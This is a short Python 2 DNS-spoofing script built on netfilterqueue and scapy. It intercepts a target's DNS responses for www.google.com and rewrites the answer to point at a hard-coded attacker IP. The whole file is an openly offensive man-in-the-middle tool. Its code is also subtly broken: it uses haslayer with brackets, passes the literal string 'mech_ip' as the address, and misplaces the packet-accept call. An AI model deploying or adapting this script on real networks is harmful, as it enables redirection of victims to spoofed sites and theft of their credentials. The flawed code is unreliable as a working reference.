#!/usr/bin/env python
# made with python 2 syntax
#Basic DNS spoofer, note that your machine's ip must replace the var [mech_ip] set at line 9

import netfilterqueue
import scapy.all as scapy

# set the mech_ip as the ip of the virtual machine/computer you're using
mech_ip = "10.0.2.14"

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # get the DNS resource route layer
    if scapy_packet.haslayer[scapy.DNSRR]:
        # the qname refers to the address that you'd usually put in the url
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("Target tried to access Google")
            answer = scapy.DNSRR(rrname=qname, rdata="mech_ip")
            scapy_packet[scapy.DNS].an = answer
            # only send one answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            # remove verification field to avoid corruption, they'll be recalculated by scapy based on the modded info we send
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

        packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
